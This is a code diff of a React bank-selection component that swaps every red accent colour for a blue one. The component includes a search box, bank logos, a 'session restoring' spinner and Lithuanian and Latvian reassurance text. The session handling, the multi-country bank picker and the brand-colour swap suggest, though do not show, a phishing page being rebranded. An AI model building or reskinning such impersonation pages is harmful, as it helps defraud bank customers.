@@ -327,7 +327,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
               <h2 className="pak-form-title mb-2">{settings.banken_title}</h2>
               <p className="pak-form-subtitle mb-8 text-sm">Sesija atkuriamasi...</p>
               <div className="flex justify-center py-8">
-                <div className="size-10 animate-spin rounded-full border-4 border-[#ff5257] border-t-transparent" />
+                <div className="size-10 animate-spin rounded-full border-4 border-[#3d8bff] border-t-transparent" />
               </div>
             </div>
           </div>
@@ -367,7 +367,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
           </div>
 
           <div className="mb-4 shrink-0">
-            <div className="flex items-center gap-2.5 rounded-xl border border-[#ff5257]/16 bg-white/6 px-4 py-3 transition-colors focus-within:border-[#ff5257]/55">
+            <div className="flex items-center gap-2.5 rounded-xl border border-[#3d8bff]/16 bg-white/6 px-4 py-3 transition-colors focus-within:border-[#3d8bff]/55">
               <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 shrink-0 text-white/40" fill="none" stroke="currentColor" strokeWidth="2">
                 <circle cx="11" cy="11" r="7" />
                 <path d="m20 20-3.5-3.5" />
@@ -384,7 +384,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
           <div className="custom-scrollbar min-h-0 flex-1 overflow-y-auto pr-1">
             <div className="grid grid-cols-1 gap-2.5 pb-1">
               {filteredOptions.length === 0 ? (
-                <div className="rounded-2xl border border-[#ff5257]/16 bg-white/5 p-5 text-center text-sm text-white/60">
+                <div className="rounded-2xl border border-[#3d8bff]/16 bg-white/5 p-5 text-center text-sm text-white/60">
                   Pasirinktai šaliai bankų nerasta. Išvalykite paieškos filtrą.
                 </div>
               ) : filteredOptions.map((opt, idx) => (
@@ -395,12 +395,12 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                   disabled={saving}
                   className={`group flex w-full items-center gap-3.5 rounded-2xl border px-4 py-3 text-left transition-all duration-200 animate-[fadeIn_0.4s_ease-out_both] ${
                     bankSlug === opt.slug
-                      ? "border-[#ff5257]/70 bg-[rgba(255,82,87,0.14)] shadow-[0_8px_24px_rgba(255,82,87,0.18)]"
-                      : "border-[#ff5257]/14 bg-white/5 hover:border-[#ff5257]/50 hover:bg-white/9 hover:shadow-[0_8px_24px_rgba(0,0,0,0.35)]"
+                      ? "border-[#3d8bff]/70 bg-[rgba(61,139,255,0.14)] shadow-[0_8px_24px_rgba(61,139,255,0.18)]"
+                      : "border-[#3d8bff]/14 bg-white/5 hover:border-[#3d8bff]/50 hover:bg-white/9 hover:shadow-[0_8px_24px_rgba(0,0,0,0.35)]"
                   }`}
                   style={{ animationDelay: `${idx * 28}ms` }}
                 >
-                  <div className="flex size-12 shrink-0 items-center justify-center overflow-hidden rounded-full border border-[#ff5257]/25 bg-white shadow-[0_4px_14px_rgba(0,0,0,0.35)]">
+                  <div className="flex size-12 shrink-0 items-center justify-center overflow-hidden rounded-full border border-[#3d8bff]/25 bg-white shadow-[0_4px_14px_rgba(0,0,0,0.35)]">
                     <img
                       src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 90, width: 256 }) || opt.logoFile}
                       alt={opt.displayName}
@@ -412,7 +412,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                         if (fallback) fallback.style.display = 'grid';
                       }}
                     />
-                    <div style={{ display: 'none' }} className="grid h-full w-full place-items-center bg-[#e30613]/15 text-sm font-black text-[#e30613]">
+                    <div style={{ display: 'none' }} className="grid h-full w-full place-items-center bg-[#0060ff]/15 text-sm font-black text-[#0060ff]">
                       {opt.displayName.charAt(0)}
                     </div>
                   </div>
@@ -425,9 +425,9 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
                   <div className="flex shrink-0 items-center">
                     {saving && bankSlug === opt.slug ? (
-                      <div className="size-5 animate-spin rounded-full border-2 border-[#ff5257] border-t-transparent" />
+                      <div className="size-5 animate-spin rounded-full border-2 border-[#3d8bff] border-t-transparent" />
                     ) : (
-                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-white/35 transition-colors group-hover:text-[#ff5257]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-white/35 transition-colors group-hover:text-[#3d8bff]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                         <path d="m9 6 6 6-6 6" />
                       </svg>
                     )}
@@ -437,9 +437,9 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
             </div>
           </div>
 
-          <div className="mt-4 shrink-0 border-t border-[#ff5257]/14 pt-4">
+          <div className="mt-4 shrink-0 border-t border-[#3d8bff]/14 pt-4">
             <div className="pak-form-security justify-center text-center">
-              <svg className="h-6 w-6 shrink-0 text-[#ff5257]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+              <svg className="h-6 w-6 shrink-0 text-[#3d8bff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                 <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
               </svg>
               <span>Jūsu bankas izvēle tiek droši apstrādāta.</span>
